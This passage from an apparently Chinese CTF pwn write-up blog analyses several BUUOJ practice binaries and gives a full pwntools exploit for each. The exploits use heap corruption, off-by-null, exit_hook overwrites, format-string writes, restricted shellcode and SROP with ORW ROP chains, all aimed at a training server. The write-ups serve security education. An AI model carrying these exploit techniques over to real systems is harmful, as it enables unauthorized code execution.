class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,data)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./de1ctf_2019_weapon')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)malloc_hook = <span class="hljs-number">0x3c4b10</span> + libc_addrfree(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">0x13</span>))add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)one = rce16[<span class="hljs-number">3</span>] + libc_addrdata = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">3</span> + p64(one)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,data)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size of weapon:'</span>,<span class="hljs-string">'10'</span>)sla(<span class="hljs-string">'dex'</span>,<span class="hljs-string">'9'</span>)<span class="hljs-comment"># add(9,0x30,'1')</span><span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>会有一个函数检查你的shellcode是否满足要求。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = a1; *i; ++i ) &#123;   <span class="hljs-keyword">for</span> ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )     ;   <span class="hljs-keyword">if</span> ( !*j )                                  <span class="hljs-comment">// 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L; &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;</code></pre></div><p>需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。</p><p>可以用的有 <code>pop rdx、pop rdi、syscall</code></p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。</p><p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p><div class="hljs"><pre><code class="hljs undefined">对于一些受限的shellcode，我们最好的办法是构造<span class="hljs-built_in">read</span>系统调用。</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有就是这个循环，其实直接可以用<code>\x00</code>截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。</p><p><strong>但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。</strong></p><p>可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">00 </span><span class="hljs-number">5</span>A <span class="hljs-number">5</span>A                    add     [rdx+<span class="hljs-number">5</span>Ah], bl</code></pre></div><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())s(<span class="hljs-string">'\x00'</span>+ <span class="hljs-string">'\x5a'</span> +<span class="hljs-string">'\x00'</span>+ shellcode)</code></pre></div><h3 id="题记-3"><a href="#题记-3" class="headerlink" title="题记"></a>题记</h3><p>感觉个人shellcode能力较差，得抽时间学习下。</p><h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>上来给了libc地址，可以任意地址3个字节的写入。</p><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>修改那里的地址，才能控制程序流程。</p><p>可以修改<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>参考这里。</p><p>在退出时：</p><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>修改<code>__rtld_lock_unlock_recursive</code>或者<code>__rtld_lock_lock_recursive</code>即可。</p><p><strong>gdb 快速获取这个地址的办法：</strong></p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p &amp;<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_rtld_lock_recursive</span></code></pre></div><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>one gadget的调整。</p><p>其中 <code>one_gadget -lx</code>  这个可以设置扫描等级获取更多的one gadget。</p><p>并且在程序中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_BC2</span><span class="hljs-params">(_BYTE *a1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( (*a1 != <span class="hljs-number">0xC5</span>u || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF2</span>u) &amp;&amp; (*a1 != <span class="hljs-number">0x22</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF3</span>u) &amp;&amp; *a1 != <span class="hljs-number">0x8C</span>u &amp;&amp; a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xA3</span>u )    <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You always want a Gold Finger!"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>对写入的地址也给限制了不能出现这几个字节。<br>其中就让很好的:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x10a38c</span> execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<span class="hljs-symbol">constraints:</span>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL</code></pre></div><p>不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。</p><p>想办法调整一下，来实现上面这个one gadget的使用。</p><p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p><p>参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：<br><code>rsi rdi rdx</code>要给控制好，其中这个gadget附近的汇编如图所示</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p><p>其中8c结尾的汇编之后是一定要执行的，其中就控制了<code>rsi rdi rdx</code>。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。</p><p>向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从<code>0x10a387</code>开始。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>执行下去发现是可以满足<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>的。</p><p>此题中对于exit hook 的改写中，<code>_dl_rtld_lock_recursive</code> 可以完成条件的满足。<code>_dl_rtld_unlock_recursive</code>不可以。<br>具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)exit_hook = <span class="hljs-number">0x81df60</span> + libc_baseone = <span class="hljs-number">0x10a387</span> + libc_base<span class="hljs-comment"># debug()</span>sl(str(exit_hook))sla(<span class="hljs-string">'biang'</span>,chr((one  &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">8</span> &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">16</span> &amp;<span class="hljs-number">0xff</span>)))itr()</code></pre></div><h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul><li>开头mmap 一段内存 rwx</li><li>libc 2.27的off by null</li><li>没有show</li></ul><h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用</li><li>off by null 留出 2个重叠的堆块</li><li>一个攻击 mmap，另一个攻击malloc hook</li></ul><p>由于tcache 基本没有什么检查，利用起来较为容易。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_easy_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28382</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex"</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))ru(<span class="hljs-string">'0x'</span>)mmap = int(r(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)add(<span class="hljs-number">0x1000</span>)add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0x90</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)    add(<span class="hljs-number">0xf0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x40</span>))free(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x60'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">0</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#9</span>free(<span class="hljs-number">6</span>)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xc0'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x30</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#10</span>shellcode = <span class="hljs-string">"""  call here  .ascii "/bin/sh"  .byte 0here:   pop rdi   xor rsi,rsi   xor rdx,rdx   mov rax,0x3b   syscall"""</span>edit(<span class="hljs-number">9</span>,asm(shellcode) + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">10</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x200</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p><p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p><h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p><p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python">offset = <span class="hljs-number">4</span>payload = fmtstr_payload(offset,&#123;<span class="hljs-number">0x804979C</span>:<span class="hljs-number">0x8048534</span>,elf.got[<span class="hljs-string">'printf'</span>]:elf.plt[<span class="hljs-string">'system'</span>]&#125;,write_size = <span class="hljs-string">"short"</span>,numbwritten = <span class="hljs-number">0</span>)s(payload)sleep(<span class="hljs-number">1</span>)sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li><li>申请同大小的堆，改ret address jmp 到 shellcode</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙盒保护，只能orw</li><li>开始给了libc地址</li><li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li></ul><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul><li>orw的rop应该往哪里写，栈地址是不知道的</li></ul><p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p><ul><li>有的gadget 使用ropgadget找不到</li></ul><div class="hljs"><pre><code class="hljs python">libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()</code></pre></div><p>可以通过机器码来找。</p><ul><li>srop 中frame执行的顺序</li></ul><p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = './vn_pwn_babybabypwn'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',25535)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()'line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0015: 0x06 0x00 0x00 0x00000000  return KILL'ru('0x')libc_base =  int(r(12),16) - libc.sym['puts']info_addr('libc_base',libc_base)free_hook = 0x3c67a8 + libc_baseread = libc.sym['read'] + libc_baseputs = libc.sym['puts'] + libc_baseopen = libc.sym['open'] + libc_basepop_rdi= 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basesyscall_ret = libc.search(asm("syscall \nret")).next() + libc_base# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rip = syscall_retframe.rsp = free_hookpayload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn# print(hex(len(frame)))s(payload)orw = flat([    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,    pop_rdi,free_hook,puts])s(orw)sleep(0.2)s('./flag')# debug()itr()</code></pre></div><h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><div class="hljs"><pre><code class="hljs python">payload = str(frame)[<span class="hljs-number">8</span>:]</code></pre></div><p>对于为什么要从8字节开始的理解？</p><p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal 